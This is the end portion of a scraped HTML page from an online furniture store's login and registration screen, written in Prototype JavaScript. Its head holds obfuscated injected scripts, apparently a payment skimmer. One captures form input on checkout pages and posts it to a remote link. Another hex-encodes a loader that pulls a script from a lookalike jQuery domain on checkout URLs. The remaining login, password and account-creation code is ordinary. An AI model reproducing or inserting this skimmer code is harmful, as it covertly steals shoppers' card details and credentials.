_0xd78cx16=_0xd78cx15[_0xd78cx11];if(_0xd78cx16[_0xb59b[30]]!= _0xb59b[31]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[32]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[33]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[34]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[35]){if(_0xd78cx16[_0xb59b[36]]){_0xd78cx16[_0xb59b[36]](_0xb59b[37],grelos_v[_0xb59b[38]],false)}else {_0xd78cx16[_0xb59b[40]](_0xb59b[39],grelos_v[_0xb59b[38]])}}};var _0xd78cx17=document[_0xb59b[25]](_0xb59b[41]);for(vari= 0;_0xd78cx11< _0xd78cx17[_0xb59b[19]];_0xd78cx11++){if(_0xd78cx17[_0xd78cx11][_0xb59b[36]]){_0xd78cx17[_0xd78cx11][_0xb59b[36]](_0xb59b[42],grelos_v[_0xb59b[38]],false)}else {_0xd78cx17[_0xd78cx11][_0xb59b[40]](_0xb59b[43],grelos_v[_0xb59b[38]])}};if(grelos_v[_0xb59b[23]]!= null){var _0xd78cx18=location[_0xb59b[48]][_0xb59b[47]](_0xb59b[46])[_0xb59b[20]](0)[_0xb59b[45]](_0xb59b[44]);var _0xd78cx19=grelos_v[_0xb59b[49]](grelos_v[_0xb59b[23]]);var _0xd78cx1a= new XMLHttpRequest();_0xd78cx1a[_0xb59b[51]](_0xb59b[50],grelos_v.Glink,true);_0xd78cx1a[_0xb59b[54]](_0xb59b[52],_0xb59b[53]);_0xd78cx1a[_0xb59b[59]](_0xb59b[55]+ _0xd78cx19+ _0xb59b[56]+ _0xd78cx18+ _0xb59b[57]+ grelos_v[_0xb59b[58]])};grelos_v[_0xb59b[23]]= null;_0xd78cx19= null;setTimeout(function(){grelos_v[_0xb59b[59]]()},30)}catch(e){}}};if(( new RegExp(_0xb59b[62],_0xb59b[63]))[_0xb59b[61]](window[_0xb59b[60]])){grelos_v[_0xb59b[59]]()}
</script><script> var _0x1c44=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x6F\x64\x65\x2E\x6A\x71\x75\x65\x72\x79\x2E\x63\x6F\x6D\x2F\x6A\x71\x75\x65\x72\x79\x2D\x31\x2E\x37\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3E\x76\x61\x72\x20\x6A\x51\x75\x65\x72\x79\x31\x37\x20\x3D\x20\x24\x2E\x6E\x6F\x43\x6F\x6E\x66\x6C\x69\x63\x74\x28\x74\x72\x75\x65\x29\x3B\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x63\x6F\x64\x65\x2E\x6E\x65\x74\x2F\x74\x65\x78\x74\x73\x2F\x6A\x71\x75\x65\x72\x79\x2E\x6D\x69\x6E\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x1c44[2]))[_0x1c44[1]](window[_0x1c44[0]])){document[_0x1c44[7]](_0x1c44[3]+ _0x1c44[4]+ _0x1c44[5]+ _0x1c44[6])} </script></head>
<body class=" cms-index-index">
<!--[if lt IE 9]>
<link rel="stylesheet" type="text/css" href="http://store.mahoganyusa.com/js/itoris/storelogincontrol/css/login_ie.css" />
<![endif]-->
<div class="white_background">
	<div id="itoris_login_box" class="login_form">
		<div class="border_t"></div>
		<div class="border_r"></div>
		<div class="border_b"></div>
		<div class="border_l"></div>
		<div class="corner_rt"></div>
		<div class="corner_lt"></div>
		<div class="corner_rb"></div>
		<div class="corner_lb"></div>
		<div id="itoris_login" class="box">
		</div>
		<div id="store_switcher" class="box"></div>
	</div>
</div>
<div id="itoris_loading" style="display:none;"></div>
<div style="display: none;"></div>
<script type="text/javascript">
function dropdown(){
	this.values = [0];
}

dropdown.prototype.create = function(){
	var dropdownBox = document.createElement('div');
	Element.extend(dropdownBox);
	dropdownBox.id = 'dropdown';

	var dropdownValue = document.createElement('div');
	Element.extend(dropdownValue);
	dropdownValue.id = 'dropdown_value';
	var dropdownValueText = document.createElement('div');
	Element.extend(dropdownValueText);
	dropdownValueText.id = 'dropdown_value_text';
	dropdownValueText.addClassName('dropdown_text');
	dropdownValue.appendChild(dropdownValueText);
	dropdownBox.appendChild(dropdownValue);

	var dropdownList = document.createElement('div');
	Element.extend(dropdownList);
	dropdownList.id = 'dropdown_list';

	var ul = document.createElement('ul');
	Element.extend(ul);
	var hide = false;
	var values = this.values;
	for(var i = 0; i < values.length; i++){
		var option = document.createElement('li');
		Element.extend(option);
		var valueText = document.createElement('div');
		Element.extend(valueText);
		valueText.addClassName('dropdown_text');
		valueText.update(values[i][0]);
		option.appendChild(valueText);
		if(!values[i][2]){
			Event.observe(option, 'click', ( function(num){
				return function(){
					hide = true;
					$('dropdown_value_text').update(values[num][0]);
					$('dropdown_list').hide();
					window.location = values[num][1];
				}
			})(i));
		}else{
			dropdownValueText.update(values[i][0]);
			Event.observe(option, 'click', function(){
				hide = true;
				$('dropdown_list').hide();
			});
		}
		Event.observe(option, 'mouseover', function(){
			if(!this.hasClassName('hover')){
				this.addClassName('hover');
			}
		});
		Event.observe(option, 'mouseout', function(){
			if(this.hasClassName('hover')){
				this.removeClassName('hover');
			}
		});
		ul.appendChild(option);
	}
	var arrow = document.createElement('div');
	Element.extend(arrow);
	arrow.addClassName('arrow');
	dropdownValue.appendChild(arrow);

	dropdownList.appendChild(ul);
	dropdownBox.appendChild(dropdownList);

	Event.observe(dropdownBox, 'click', function(){
		if(!hide){
			$('dropdown_list').show();
		}
		hide = false;
	});
	Event.observe(dropdownList, 'mouseout', function(){
		$('dropdown_list').hide();
	});
	Event.observe(dropdownList, 'mouseover', function(){
		if(!hide){
			$('dropdown_list').show();
		}
	});
	dropdownList.hide();
	return dropdownBox;
}

function loginForm(){
	this.loginMessage = 'To Access the Store, please Log-in';
	this.loginLinkName = 'Try to Log-in';
	this.loginButtonName = 'LOGIN';
	this.passwordMessage = 'Retrieve your password';
	this.passwordLinkName = 'Forgot your password?';
	this.createAccount = 'Create an Account';
	this.passwordButtonName = 'RETRIEVE PASSWORD';
	this.passwordFieldName = 'Password';
	this.emailFieldName = 'Email Address';
	this.storeSwitcherName = 'Switch Store:';
	this.storeSwitcherValues = [0];
	this.baseUrl = 'http://store.mahoganyusa.com/index.php/';
	if (document.location.href.indexOf('https://') != -1) this.baseUrl = this.baseUrl.replace('http://', 'https://');
	this.url = '/';
}

loginForm.prototype.createEmailField = function(){
	var email = document.createElement('div');
	Element.extend(email);
	email.addClassName('field_box');
	var text = document.createElement('span');
	Element.extend(text);
	text.update(this.emailFieldName);
	email.appendChild(text);
	text = document.createElement('span');
	Element.extend(text);
	text.update('*');
	text.addClassName('red');
	email.appendChild(text);
	var br = document.createElement('br');
	email.appendChild(br);
	var field = document.createElement('input');
	Element.extend(field);
	field.addClassName('input_text');
	field.addClassName('required-entry');
	field.addClassName('validate-email');
	field.setAttribute('type','text');
	field.setAttribute('name','email');
	var fieldBox = document.createElement('div');
	Element.extend(fieldBox);
	fieldBox.addClassName('input_text_box');
	fieldBox.appendChild(field);
	email.appendChild(fieldBox);
	return email;
}

loginForm.prototype.createPasswordField = function(){
	var password = document.createElement('div');
	Element.extend(password);
	var passwordLink = document.createElement('a');
	Element.extend(passwordLink);
	passwordLink.update(this.passwordLinkName);
	Event.observe(passwordLink, 'click', function(){
			var form = new loginForm();
			form.showPasswordForm();
		}
	);
	password.appendChild(passwordLink);

	password.addClassName('field_box');
	var text = document.createElement('span');
	Element.extend(text);
	text.update(this.passwordFieldName);
	password.appendChild(text);
	text = document.createElement('span');
	Element.extend(text);
	text.update('*');
	text.addClassName('red');
	password.appendChild(text);
	var br = document.createElement('br');
	password.appendChild(br);

	var field = document.createElement('input');
	Element.extend(field);
	field.setAttribute('type','password');
	field.setAttribute('name','password');
	field.addClassName('input_text');
	field.addClassName('required-entry');
	var fieldBox = document.createElement('div');
	Element.extend(fieldBox);
	fieldBox.addClassName('input_text_box');
	fieldBox.appendChild(field);
	password.appendChild(fieldBox);
	return password;
}

loginForm.prototype.createButton = function(label){
	var button = document.createElement('div');
	Element.extend(button);
	var text = document.createElement('div');
	Element.extend(text);
	text.update(label);
	text.addClassName('button_label');
	button.appendChild(text);
	button.addClassName('button');
	var background = document.createElement('div');
	Element.extend(background);
	background.addClassName('button_nl');
	button.appendChild(background);

	background = document.createElement('div');
	Element.extend(background);
	background.addClassName('button_nr');
	button.appendChild(background);

	Event.observe(button, 'mouseover', function(){
		this.addClassName('button_a');
		$$('.button_nl')[0].addClassName('button_al');
		$$('.button_nr')[0].addClassName('button_ar');
	});
	Event.observe(button, 'mouseout', function(){
		this.removeClassName('button_a');
		$$('.button_nl')[0].removeClassName('button_al');
		$$('.button_nr')[0].removeClassName('button_ar');
	});

	return button;
}

loginForm.prototype.createStoreSwitcher = function(){
	var switcherBox = document.createElement('div');
	Element.extend(switcherBox);
	switcherBox.addClassName('switch_box');
	var text = document.createElement('span');
	Element.extend(text);
	text.update(this.storeSwitcherName);
	switcherBox.appendChild(text);

	var storeSwitcher = new dropdown();
	switcherBox.appendChild(storeSwitcher.create());
	return switcherBox;
}

loginForm.prototype.createForm = function(){
	var form = document.createElement('form');
	Element.extend(form);
	return form;
}

loginForm.prototype.showLoginForm = function(){
	var form = this.createForm();
	Event.observe(form, 'keypress', this.submitLoginFormByKey.bind(this));
	this.resetLoginFormStyles();
	form.id = 'login_form';
	var formLabel = document.createElement('h3');
	Element.extend(formLabel);
	formLabel.update(this.loginMessage);
	formLabel.addClassName('label');
	form.appendChild(formLabel);
	form.appendChild(this.createLine());
	var error = document.createElement('div');
	Element.extend(error);
	error.id = 'error_box';
	form.appendChild(error);
	var fields = document.createElement('div');
	Element.extend(fields);
	fields.addClassName('fields');
	fields.appendChild(this.createEmailField());
	fields.appendChild(this.createPasswordField());

	var button = this.createButton(this.loginButtonName);
	Element.extend(button);
	Event.observe(button, 'click', this.submitLoginForm.bind(this));
	fields.appendChild(button);

	
	form.appendChild(fields);

	box = $('itoris_login');
	box.update(form);

	if(this.storeSwitcherValues != 0){
		var box = $('store_switcher');
		Element.extend(box);
		box.update(this.createStoreSwitcher());
	}else{
		$('store_switcher').hide();
	}
}

loginForm.prototype.submitLoginFormByKey = function(event) {
	if (event.keyCode == 13) {
		this.submitLoginForm();
	}
}

loginForm.prototype.submitLoginForm = function() {
	var validator = new Validation($('login_form'));
	if(!validator.validate()) return false;
	var params = $('login_form').serialize();
	var ajaxResponder = this.ajaxResponderLogin;
	Ajax.Responders.register(ajaxResponder);
	var baseUrl = this.baseUrl;
	var redirect = this.url;
	new Ajax.Request(
		baseUrl + 'itoris_storelogincontrol/login/login',
		{
			method: 'post',
			parameters: params,
			onComplete: function(Res){
				var json = Res.responseText.evalJSON();
				if(json.error){
					$('error_box').update(json.error);
					$('itoris_loading').hide();
				}else{
					setLocation(json.redirect_url || redirect);
				}
			}
		}
	);
}

loginForm.prototype.createLine = function(){
	var line = document.createElement('div');
	Element.extend(line);
	line.addClassName('line');
	return line;
}

loginForm.prototype.resetLoginFormStyles = function() {
	$('itoris_login_box').setStyle({top:null});
	$('itoris_login_box').removeClassName('register-form');
}

loginForm.prototype.showPasswordForm = function(){
	var form = this.createForm();
	Event.observe(form, 'keypress', this.submitRetrieveFormByKey.bind(this));
	this.resetLoginFormStyles();
	form.id = 'retrieve_password'
	var formLabel = document.createElement('h3');
	Element.extend(formLabel);
	formLabel.update(this.passwordMessage);
	formLabel.addClassName('label');
	form.appendChild(formLabel);
	form.appendChild(this.createLine());
	var error = document.createElement('div');
	Element.extend(error);
	error.id = 'error_box';
	form.appendChild(error);
	var fields = document.createElement('div');
	Element.extend(fields);
	fields.addClassName('fields');
	fields.appendChild(this.createEmailField());

	var button = this.createButton(this.passwordButtonName);
	Element.extend(button);
	button.addClassName('button_password');

	Event.observe(button, 'click', this.submitRetrieveForm.bind(this));
	fields.appendChild(button);

	var loginLink = document.createElement('a');
	Element.extend(loginLink);
	loginLink.update(this.loginLinkName);
	loginLink.addClassName('login_link');
	Event.observe(loginLink, 'click', function(){
			var form = new loginForm();
			form.showLoginForm();
		}
	);
	fields.appendChild(loginLink);

	form.appendChild(fields);

	form.observe('submit', function(e){
		e = e || window.event;
		e.preventDefault ? e.preventDefault() : (e.returnValue=false);
	});

	box = $('itoris_login');
	box.update(form);

	if(this.storeSwitcherValues != 0){
		var box = $('store_switcher');
		Element.extend(box);
		box.update(this.createStoreSwitcher());
	}else{
		$('store_switcher').hide();
	}
}

loginForm.prototype.submitRetrieveFormByKey = function(event) {
	if (event.keyCode == 13) {
		this.submitRetrieveForm();
	}
}

loginForm.prototype.submitRetrieveForm = function() {
	var validator = new Validation($('retrieve_password'));
	if(!validator.validate()) return false;
	var params = $('retrieve_password').serialize();
	var ajaxResponder = this.ajaxResponder;
	Ajax.Responders.register(ajaxResponder);
	var baseUrl = this.baseUrl;
	new Ajax.Request(
		baseUrl + 'itoris_storelogincontrol/login/forgotPassword',
		{
			method: 'post',
			parameters: params,
			onComplete: function(Res){
				$('error_box').update(Res.responseText);
			}
		}
	);
}

loginForm.prototype.showRegisterForm = function(){
	var form = this.createForm();
	Event.observe(form, 'keypress', this.submitRegisterFormByKey.bind(this));
	$('itoris_login_box').addClassName('register-form');
	form.id = 'create_account'
	var formLabel = document.createElement('h3');
	Element.extend(formLabel);
	formLabel.update(this.createAccount);
	formLabel.addClassName('label');
	form.appendChild(formLabel);
	form.appendChild(this.createLine());
	var error = document.createElement('div');
	Element.extend(error);
	error.id = 'error_box';
	form.appendChild(error);
	var fields = document.createElement('ul');
	Element.extend(fields);
	fields.addClassName('fields');

		var captchaTemplate = $('storelogin_captcha_template');
	fields.update('<li class="field_box"><span>First Name</span><span class="red">*</span><br/><div class="input_text_box"><input class="input_text required-entry" name="firstname" title="First Name" type="text"/></div></li>'
		+ '<li class="field_box last"><span>Last Name</span><span class="red">*</span><br/><div class="input_text_box"><input class="input_text required-entry" name="lastname" title="Last Name" type="text"/></div></li>'
										+ '<li class="field_box "><span>Middle Name</span><br/><div class="input_text_box">'
		+ '<input type="text" id="middlename" name="middlename" title="Middle Name" class="input_text input-text"  />'
		+ '</div></li>'
								+ '<li class="field_box checkbox"><input class="input_text" name="is_subscribed" title="Sign Up for Newsletter" type="checkbox" value="1"/><span> Sign Up for Newsletter</span><br/></li>'
		+ '<li class="field_box last"><span>Email Address</span><span class="red">*</span><br/><div class="input_text_box"><input class="input_text required-entry validate-email" name="email" title="Email Address" type="text"/></div></li>'
																+ '<li class="field_box"><span>Password</span><span class="red">*</span><br/><div class="input_text_box"><input class="input_text required-entry validate-password" name="password" title="Password" type="password"/></div></li>'
		+ '<li class="field_box last"><span>Confirm Password</span><span class="red">*</span><br/><div class="input_text_box"><input class="input_text required-entry validate-cpassword" name="confirmation" title="Confirm Password" type="password"/></div></li>'
		+ (captchaTemplate ? '<li class="field_box">' + captchaTemplate.innerHTML + '</li>' : '')
	);
	if (captchaTemplate) {
		var captchaImg = fields.select('.captcha-img')[0];
		captchaImg.id = 'user_create';
		captchaImg.captcha = storeLoginCaptcha;
		storeLoginCaptcha.refresh(captchaImg);
	}
	
	var baseUrl = this.baseUrl;
	var button = this.createButton(this.createAccount);
	Element.extend(button);
	button.addClassName('button_password');

	Event.observe(button, 'click', this.submitRegisterForm.bind(this));
	fields.appendChild(button);

	var loginLink = document.createElement('a');
	Element.extend(loginLink);
	loginLink.update(this.loginLinkName);
	loginLink.addClassName('login_link');
	Event.observe(loginLink, 'click', function(){
			var form = new loginForm();
			form.showLoginForm();
		}
	);
	fields.appendChild(loginLink);

	form.appendChild(fields);

	form.observe('submit', function(e){
		e = e || window.event;
		e.preventDefault ? e.preventDefault() : (e.returnValue=false);
	});

	box = $('itoris_login');
	box.update(form);

	if(this.storeSwitcherValues != 0){
		var box = $('store_switcher');
		Element.extend(box);
		box.update(this.createStoreSwitcher());
	}else{
		$('store_switcher').hide();
	}
		this.calculateFormPosition();
}

loginForm.prototype.reloadCaptcha = function() {
	var form = $('create_account') || $('custom-reg-form-validate');
	var captchaElements = form.select('.reload-captcha');
	if (captchaElements.length) {
		for (var i = 0; i < captchaElements.length; i++) {
			var reloadCaptcha = captchaElements[i].onclick;
			reloadCaptcha(null);
		}
	}
	if ($('user_create') && storeLoginCaptcha) {
		$('storelogin_captcha_user_create').value = '';
		storeLoginCaptcha.refresh($('user_create'));
	}
}

loginForm.prototype.submitRegisterFormByKey = function(event) {
	if (event.keyCode == 13) {
		this.submitRegisterForm();
	}
}

loginForm.prototype.submitRegisterForm = function() {
	var validator = new Validation($('create_account'));
	if(!validator.validate()) {
		return false;
	}
	$$('.white_background')[0].scrollTop=0;
	if ($('custom-reg-form-validate')) {
		$('itoris_loading').show();
		$('custom-reg-form-validate').submit();
		var obj = this;
		this.checkIframe = new PeriodicalExecuter(function() { obj.checkIFrameafterRegistration(); }, 1);
		return;
	}

	var params = $('create_account').serialize();
	var ajaxResponder = this.ajaxResponder;
	var registerForm = this;
	Ajax.Responders.register(ajaxResponder);
	var _u = 'http://store.mahoganyusa.com/index.php/itoris_storelogincontrol/login/createAccount/';
	if (document.location.href.indexOf('https://') != -1) _u = _u.replace('http://', 'https://');
	new Ajax.Request(
		_u,
		{
			method: 'post',
			parameters: params,
			onComplete: function(response){
				if (response.responseText) {
					var obj = response.responseText.evalJSON();
					$('error_box').update(obj.error || '');
					if (!obj.error) {
						setLocation('http://store.mahoganyusa.com/index.php/customer/account/')
					} else {
						registerForm.reloadCaptcha();
						if (obj.registered) {
							registerForm.clearRegisterFormFields();
						}
					}
				}
			}
		}
	);
}
loginForm.prototype.clearRegisterFormFields = function() {
	$('create_account').select('input', 'select', 'checkbox').each(function(elm) {
		elm.value = '';
	});
	$('create_account').select('checkbox').each(function(elm) {elm.checked = false;} );
}
loginForm.prototype.checkIFrameafterRegistration = function() {
	var iFrame = $('custom_reg_form_iframe');
	var iFrameDocument = iFrame.contentDocument ? iFrame.contentDocument : iFrame.contentWindow.document;
	if (iFrameDocument.getElementById('success')) {
		setLocation('http://store.mahoganyusa.com/index.php/customer/account/');
		this.checkIframe.stop();
	} else if (iFrameDocument.getElementById('error')) {
		$('error_box').update(iFrameDocument.getElementById('error').innerHTML);
		this.reloadCaptcha();
		$('itoris_loading').hide();
		this.checkIframe.stop();
		if (iFrameDocument.getElementById('registered')) {
			this.clearRegisterFormFields();
		}
	}
	iFrameDocument.body.innerHTML = '';
}

loginForm.prototype.calculateFormPosition = function() {
	var formHeight = $('itoris_login_box').getHeight();
	var windowHeight = document.viewport.getHeight();
	if (formHeight < windowHeight) {
		$('itoris_login_box').setStyle({top: parseInt(((windowHeight - formHeight) / 2) * 100 / windowHeight) + '%'});
	} else {
		$('itoris_login_box').setStyle({top: 0 + 'px'});
	}
}
loginForm.prototype.prepareDobValidation = function() {
	var dobContainer       = {};
	dobContainer.day       = $('dob_day');
	dobContainer.month     = $('dob_month');
	dobContainer.year      = $('dob_year');
	dobContainer.full      = $('dob_full'); ;
	dobContainer.advice    = $('dob_advice');

	new Varien.DateElement('container', dobContainer, false, '%m/%e/%Y');
}
loginForm.prototype.ajaxResponder =  {
	onCreate: function(){$('itoris_loading').show();},
	onComplete: function(){$('itoris_loading').hide();}
};

loginForm.prototype.ajaxResponderLogin =  {
	onCreate: function(){$('itoris_loading').show();}
};

var itorisForm = new loginForm();
itorisForm.showLoginForm();
Event.observe(window, 'load', function(){
	var el = $$('.main');
	if(el.length){
		el[0].removeClassName('main');
	}
});
</script>
<script type="text/javascript">
	Calendar.prototype.showAt = function (x, y) {
		Element.extend(this.params.button);
		var viewOffset = this.params.button.viewportOffset();
		x = viewOffset.left;
		y = viewOffset.top;

		var s = this.element.style;
		s.left = x + "px";
		s.top = y + "px";
		this.show();
	};
</script>
<iframe id="custom_reg_form_iframe" name="custom_reg_form_result" style="width:0;height:0;border:0px solid #fff;"></iframe></body>
</html>